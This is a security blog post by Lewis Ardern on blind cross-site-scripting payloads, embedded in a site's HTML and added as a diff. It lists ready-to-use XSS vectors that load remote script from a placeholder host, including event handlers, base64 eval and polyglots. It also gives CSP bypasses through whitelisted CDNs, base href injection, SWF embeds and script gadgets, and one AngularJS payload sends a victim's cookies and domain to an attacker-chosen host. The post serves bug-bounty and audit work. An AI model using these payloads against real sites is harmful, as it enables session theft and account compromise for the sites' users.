@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.8.0">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <!--Description-->
+    
+        <meta name="description" content="When auditing applications, sometimes context is lost, and issues are missed. The same will be true when looking for Blind Cross-Site-Scripting (bXSS)">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Lewis Ardern">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Advanced Blind XSS Payloads">
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="ardern.io">
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article">
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary">
+    
+
+    <!-- Title -->
+    
+    <title>Advanced Blind XSS Payloads - ardern.io</title>
+
+    <!-- Tachyons Core CSS -->
+    <link rel="stylesheet" href="//unpkg.com/tachyons/css/tachyons.min.css">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<!-- Main Content -->
+<!-- Banner -->
+
+<!-- Banner -->
+<div class="w-100 bg-1 ph5-ns ph3 text-light">
+    
+    <nav class="db dt-l w-100 mw8 center border-box pv3">
+        <!-- <a class="db dtc-l v-mid link dim w-100 w-25-l tc tl-l mb2 mb0-l white" href="/" title="ardern.io">
+            <img src="" class="dib h3" alt="ardern.io">
+        </a>  -->
+        <a class="db dtc-l v-mid link dim w-100 w-25-l tc tl-l mb2 mb0-l white" href="/" title="ardern.io">      
+            ardern.io    
+        </a>
+        <div class="db dtc-l v-mid w-100 w-75-l tc tr-l">
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" href="/" title="Home">
+                    Home
+                </a>
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" href="/about" title="About">
+                    About
+                </a>
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" href="/content" title="Content">
+                    Content
+                </a>
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" href="/archives" title="Archives">
+                    Archives
+                </a>
+            
+        </div>
+    </nav>
+
+    <!-- Title -->
+    <div class="w-100 mw8 center vh-40 dt">
+        <div class="dtc v-mid white">
+            <h1 class="f1-l f2-m tc tc-m tl-ns">Advanced Blind XSS Payloads</h1>
+            <p class="f4 fw3 pab-100px tc tc-m tl-ns">2019-06-20</p>
+        </div>
+    </div>
+
+    <!-- Icon -->
+    <div class="relative w-100 mw8 center white dn dn-m db-ns">
+        <i class="header-icon fa fa-unlock"></i>
+    </div>
+</div>
+
+
+    
+<!-- Content -->
+<div class="w-100 ph2 ph4-m ph5-l mv5 mv6-l">
+    <div class="content">
+        <div class="mw8 center">
+            <div class="cf">
+                <div class="fl w-100 w-70-l mw7 left fw3 lh-copy pr4-ns pr0-m post-content">
+                    <!-- Tags Vertical -->
+                    
+                        <div class="tags-container-vertical">
+                            <div class="tags-sub-container">
+                                <a class="fw3 ph1 dib" href="/tags/XSS/">#XSS</a> <a class="fw3 ph1 dib" href="/tags/bXSS/">#bXSS</a> <a class="fw3 ph1 dib" href="/tags/Security/">#Security</a>
+                            </div>
+                        </div>
+                    
+
+                    <!-- Main Post Content -->
+                    <!-- So you thought you were safe ALT... Think again -->
+<p>When auditing applications, sometimes context is lost, and issues are missed. The same will be true when looking for <a href="https://ardern.io/2017/12/10/blind-xss/">Blind Cross-Site-Scripting (bXSS)</a>. Last year I blogged about <a href="https://ardern.io/2018/12/07/angularjs-bxss/">AngularJS bXSS</a> and how you can leverage AngularJS to execute JavaScript for you in a bXSS context. </p>
+<p>In this post I want to increase the payload definition for various ways to detect bXSS, hopefully helping identify undiscovered bXSS in back-end systems. I wanted to do this in an automated way, so by creating  different context blind XSS payloads, which can be used either in Burp or other automated scanning tools for services such as <a href="https://xsshunter.com" target="_blank" rel="noopener">xsshunter</a> or <a href="https://github.com/LewisArdern/bXSS" target="_blank" rel="noopener">bXSS (which all of these are included by default).</a></p>
+<h2 id="Verifying-bXSS"><a href="#Verifying-bXSS" class="headerlink" title="Verifying bXSS"></a>Verifying bXSS</h2><p><b>Images</b><br>The simplest way to confirm bXSS most of the time is to include an image to render and capture the referer (if this is good enough for you, then you can ignore the rest of the blog). It is very rare to see a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/img-src" target="_blank" rel="noopener">Content-Security-Policy with img-src</a>, but it does happen and it has been seen in the wild, which blocks arbitrary domains.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Image for HTTP Interaction --&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'//domain/xss'</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>You may want to take into account frameworks like Angular and AngularJS which sanitizes untrusted data, but will retain <a href="https://stackblitz.com/edit/angular-inner-html-lrmddo" target="_blank" rel="noopener">images</a> as they are technically valid HTML and will remove event handlers (which makes sense) but then this would likely be HTML Injection, and if an application is using img-src, this would not work as it is unlikely that the domain we control is in the approved whitelist.</p>
+<img src="/2019/06/20/payload-bxss/Images.jpg" title="image from stackblitz">
+<p>The next payload is more traditional, external JavaScript where we include a third-party script to render additional content, never take this payload for granted; it may just earn you <a href="https://samcurry.net/cracking-my-windshield-and-earning-10000-on-the-tesla-bug-bounty-program/" target="_blank" rel="noopener">$10,000</a>:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- External JavaScript --&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//domain/xss.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>JavaScript URIs can also be used for React applications, and anywhere input is injected in a href prop:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JavaScript URI</span></span><br><span class="line">javascript:<span class="built_in">eval</span>(<span class="string">'d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)'</span>);</span><br></pre></td></tr></table></figure>
+<p>Another way is to inject arbitrary HTML including a JavaScript URI in a href.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- JavaScript URI in a href --&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')"</span>&gt;</span>Click Me For An Awesome Time<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>Now let’s look at the rest of the execution ecosystem for the browser, there is SVG, HTML5, event handlers, CSS (mostly obsolete so wont be included). </p>
+<p>Rather than reinventing the wheel, <a href="https://html5sec.org" target="_blank" rel="noopener">HTML5Sec.org</a> contains an abundance of payloads which can be used to build bXSS payloads, here are a few which contains their definitions on why they are useful:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- html5sec - Self-executing focus event via autofocus: --&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">"eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')"</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- html5sec - JavaScript execution via iframe and onload --&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">"eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')"</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- html5sec - SVG tags allow code to be executed with onload without any other elements. --&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">"javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- html5sec -  allow error handlers in &lt;SOURCE&gt; tags if encapsulated by a &lt;VIDEO&gt; tag. The same works for &lt;AUDIO&gt; tags  --&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">"eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  --&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">"eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a href="https://twitter.com/IAmMandatory" target="_blank" rel="noopener">Matthew Byrant</a> created some fantastic payloads for <a href="https://xsshunter.com" target="_blank" rel="noopener">xsshunter</a> which are extremely useful in applications that blacklist malicious characters, or if they use jQuery.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- xsshunter.com - Sites that use JQuery --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.getScript(<span class="string">"//domain"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- xsshunter.com - When &lt;script&gt; is filtered --&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">id</span>=<span class="string">payload&amp;#61;&amp;#61;</span> <span class="attr">onerror</span>=<span class="string">eval(atob(this.id))</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- xsshunter.com - Bypassing poorly designed systems with autofocus --&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">eval(atob(this.id))</span> <span class="attr">id</span>=<span class="string">payload&amp;#61;&amp;#61;</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>So far we have Image HTTP interaction, external JavaScript, JavaScript URI, a href, event handlers, SVG, JQuery, and I already blogged about <a href="https://ardern.io/2018/12/07/angularjs-bxss/">AngularJS</a>; you could probably make some additional payloads from great resources such as <a href="https://html5sec.org" target="_blank" rel="noopener">HTML5sec</a>, <a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md" target="_blank" rel="noopener">Ed’s bug bounty-cheatsheet</a>, or <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank" rel="noopener">XSS Injection</a>.</p>
+<h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>The browser teams have really started to introduce some amazing controls and if you watch <a href="https://www.youtube.com/watch?v=_L06HetskC4" target="_blank" rel="noopener">Lukas’ and Michele’ talk on Content Security Policy (CSP)</a> you will see the innovation but the complexity has also increased. There will be cases where an injection exists, but they have deployed a CSP, and generic  payloads will not work! Even images will not load if a website has an img-src, so we need to get creative.</p>
+<p>The good news is that there are various <a href="http://sebastian-lekies.de/csp/bypasses.php" target="_blank" rel="noopener">CSP bypasses.</a> <a href="http://conference.hitb.org/hitbsecconf2016ams/wp-content/uploads/2015/11/D1T2-Michele-Spagnuolo-and-Lukas-Weichselbaum-CSP-Oddities.pdf" target="_blank" rel="noopener">Lukas and Michelle</a> document various ways CSP can be bypassed.</p>
+<p>Each site will have a different CSP, some organizations may re-use similar patterns but if you can see a policy, throwing it into <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">csp-evaluator.withgoogle.com</a> will straight away give you some context into what injection vectors exist.</p>
+<img src="/2019/06/20/payload-bxss/csp.jpg" title="csp-evaluator">
+<p>Want to know something important about CSP? </p>
+<blockquote>
+<p>Once you find a valid execution context, CSP does not prevent you from exfiltrating data to another origin through <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/location" target="_blank" rel="noopener">document.location</a>. CSP is not made to prevent data exfiltration and that this is commonly misunderstood, it is only intended to be used to define what resources should be loaded and executed.</p>
+</blockquote>
+<p>Let’s see how this might work in AngularJS:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Adapted from Gareth Heyes/sirdarkcat --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">content-security-policy</span> <span class="attr">content</span>=<span class="string">"object-src 'none';script-src 'nonce-secret';"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">secret</span> <span class="attr">src</span>=<span class="string">"https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span> <span class="attr">ng-csp</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">autofocus</span></span></span><br><span class="line"><span class="tag">      <span class="attr">ng-focus</span>=<span class="string">"d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH?exfil='+$event.view.encodeURI(d.domain+';'+d.cookie)"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Which will exfiltrate relevant parts of the document to the domain of your choosing.</p>
+<img src="/2019/06/20/payload-bxss/exfil.jpg" title="exfil domain/cookie">
+<p><b>Whitelisted CDNs</b></p>
+<p>Whitelisted CDNs in a CSP is an attacker’s dream and a defender’s worst nightmare, <a href="https://ai.google/research/pubs/pub45542" target="_blank" rel="noopener">it’s been documented in the past</a>, most policies were bypassed due to a whitelisted CDN, so a simple way to test for this type of injection would be to build a directory of CDNs and inject them all into the page alongside a valid execution context such as AngularJS.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span> <span class="attr">ng-csp</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">autofocus</span> <span class="attr">ng-focus</span>=<span class="string">"d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><b>base-src</b></p>
+<p>The most often misunderstood element in HTML is the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base" target="_blank" rel="noopener">base</a> element which will redirect all relative scripts loaded underneath the injection point, to a third-party origin; this includes the valid CSP nonce!</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- will change https://example.com/scripts/foo.js to https://domain/scripts/foo.js --&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"//domain"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'secret'</span> <span class="attr">src</span>=<span class="string">'./scripts/foo.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>All you need to do is to configure your server <a href="https://github.com/LewisArdern/bXSS" target="_blank" rel="noopener">(such as bXSS)</a> to have a wildcard render your payload if you are ever able to successfully inject the base href into an application, this also would work on <a href="https://xsshunter.com" target="_blank" rel="noopener">XSSHunter</a>.</p>
+<img src="/2019/06/20/payload-bxss/basehref.jpg" title="basehref example wildcard">
+<p><b>object-src</b><br>A common issue with CSP is when the object-src is not defined which can be bypassed with <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed" target="_blank" rel="noopener">embed</a>, <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object" target="_blank" rel="noopener">object</a>, or <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet" target="_blank" rel="noopener">applet</a> but many of these are becoming obsolete or harder to execute JavaScript due to browser security improvements.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- object-src is relaxed or missing adapted from https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22  --&gt;</span></span><br><span class="line"></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">'//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain="&#125;)))&#125;catch (e) &#123; d = document; d.location.hash.match(`x1`) ? `` : d.location=`//localhost/mH`&#125;//'</span> <span class="attr">allowscriptaccess</span>=<span class="string">always</span>&gt;</span></span><br><span class="line"></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">'//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"&#125;)))&#125;catch (e) &#123; d = document; d.location.hash.match(`x1`) ? `` : d.location=`//localhost/mH`&#125;//'</span> <span class="attr">allowscriptaccess</span>=<span class="string">always</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><b>script-src</b></p>
+<p>If a CSP policy enables HTTPS, *, data, etc in script-src it is generally quite easy to bypass:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- data scheme or wildcard in script-src --&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:text/javascript;base64,ZD1kb2N1bWVudDsgXyA9IGQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7Xy5pZD0nMTknO18ubm9uY2U9ZC5xdWVyeVNlbGVjdG9yKCdbbm9uY2VdJykubm9uY2U7Xy5zcmM9Jy8vbG9jYWxob3N0L20nO2QuYm9keS5hcHBlbmRDaGlsZChfKSA</span>=&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https:// in script-src --&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'https://domain'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><b>Script Gadgets</b></p>
+<p>The Google team released research on <a href="https://github.com/google/security-research-pocs/tree/master/script-gadgets" target="_blank" rel="noopener">Script Gadgets</a> in 2017 which introduced new ways to bypass CSP. To recap, Script Gadgets is legitimate JavaScript code which can be triggered by HTML Injection. This means libraries/frameworks like AngularJS (exampled above), Vue, Aurelia, etc; could be used in a bXSS context. Script Gadgets can be useful at bypassing CSP, XSS Filters, Sanitizers, and WAFs; so they should be used in an attackers arsenal.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Google Research - AngularJS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span> <span class="attr">ng-csp</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">autofocus</span> <span class="attr">ng-focus</span>=<span class="string">"d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Google Research - Vue.js--&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">div</span> <span class="attr">v-html</span>=<span class="string">"''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//localhost/mH`')()"</span>&gt;</span> aaa<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>The payload list could be extended further with the research provided by the Google team which <a href="https://github.com/google/security-research-pocs/blob/master/script-gadgets/bypasses.md" target="_blank" rel="noopener">included a list of bypasses</a> for various libraries and frameworks.</p>
+<p><b>Polyglot Payloads</b></p>
+<p>For a wide attack surface using polyglot payloads which run in multiple contexts will help identify issues such as bXSS. A good talk by <a href="https://www.slideshare.net/MathiasKarlsson2/polyglot-payloads-in-practice-by-avlidienbrunn-at-hackpra" target="_blank" rel="noopener">Mathias Karlsson</a> goes into detail about creating payloads and this could be key at finding undiscovered bXSS issues in third-party applications, below at two useful contexts; these could probably be extended further by creating framework-specific polyglot payloads.</p>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gareth Heyes - https://twitter.com/garethheyes</span></span><br><span class="line">javascript:<span class="comment">/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/"/+/onmouseover=1/+/[*/</span>[]/+<span class="built_in">document</span>.location=<span class="string">`//localhost/mH`</span><span class="comment">//'&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// clrf -  http://polyglot.innerht.ml/</span></span><br><span class="line">javascript:<span class="string">"/*'/*`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html \" onmouseover=/*&amp;lt;svg/*/onload=document.location=`//localhost/mH`//&gt;</span></span><br></pre></td></tr></table></figure>
+<p>I hope this blogpost was useful, these payloads are integrated into <a href="https://github.com/LewisArdern/bXSS" target="_blank" rel="noopener">bXSS</a> and here is a <a href="https://gist.github.com/LewisArdern/e1b09e85345ecd78713b16042ea6ded6" target="_blank" rel="noopener">gist containing all of the payloads above</a>, also thank you <a href="https://twitter.com/CryptoGangsta" target="_blank" rel="noopener">Parsia</a> and <a href="https://twitter.com/garethheyes" target="_blank" rel="noopener">Gareth</a> for reviewing the blog post before publication.</p>
+
+                    
+                    <!-- Tags Bottom -->
+                    
+                        <div class="tags-container-bottom">
+                            <i class="fa fa-tag pr3 text-main-color"></i><a class="fw3 ph1 dib" href="/tags/XSS/">#XSS</a> <a class="fw3 ph1 dib" href="/tags/bXSS/">#bXSS</a> <a class="fw3 ph1 dib" href="/tags/Security/">#Security</a>
+                        </div>
+                    
+
+                    <!-- Comments -->
+                    
+<div id="disqus_thread" class="mt5">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+
+
+
+                </div>
+                <div class="fl w-100 w-30-l center fw3 lh-copy pl4-ns tl black-50">
+                    
+                    <hr class="dn-l mw4 black-50 mt5">
+                    
+                    <!-- Widget 1: About -->
+                    <div class="mt5 mt0-l">
+    <article class="dt db-l mw8 mw8-m mw5-ns center ml0-l bg-white mv3">
+        <div class="dn dtc-m db-l v-mid tc pr4 pr0-l" style="min-width: 6rem;">
+            <img src="https://pbs.twimg.com/profile_images/877900659319853056/iaUa6_XV_400x400.jpg" class="mb4-l br-100 h3 w3 h4-l w4-l dib" title="Lewis Ardern">
+        </div>
+        <div style="color:#7C8999" class="dtc db-l v-mid lh-copy measure center f6 -50 tj">
+            Hello, I am Lewis Ardern, pictured above. I work as a Security Consultant with a strong focus on Web Security. <br>Based and working in San Francisco.
+        </div>
+    </article>
+</div>
+
+                    <hr class="dn-l mw4 black-50 mt5">
+                    
+                    <!-- Widget 2: Categories -->
+                    
+
+                    <!-- Widget 3: Recent Posts -->
+                    <div class="mt5 tc tl-l">
+    <h3>Recent Posts</h3>
+    
+        <p>
+            <a href="/2019/06/20/payload-bxss/">Advanced Blind XSS Payloads</a>
+        </p>
+    
+        <p>
+            <a href="/2018/12/07/angularjs-bxss/">Blind XSS AngularJS Payloads</a>
+        </p>
+    
+        <p>
+            <a href="/2018/02/23/Apple-XSS/">Planet Of The XSS</a>
+        </p>
+    
+        <p>
+            <a href="/2017/12/10/blind-xss/">Ode To Blind XSS</a>
+        </p>
+    
+</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<!-- Footer -->
+<div class="bg-1 ph2 ph5-ns pv5">
+        <div class="mv8">
+            <div class="center tc">
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="https://twitter.com/LewisArdern" target="_blank">
+                            <i class="fa fa-twitter"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="https://github.com/LewisArdern" target="_blank">
+                            <i class="fa fa-github"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="mailto:lewis@ardern.io" target="_blank">
+                            <i class="fa fa-envelope"></i>
+                        </a>
+                    </div>
+                
+            </div>
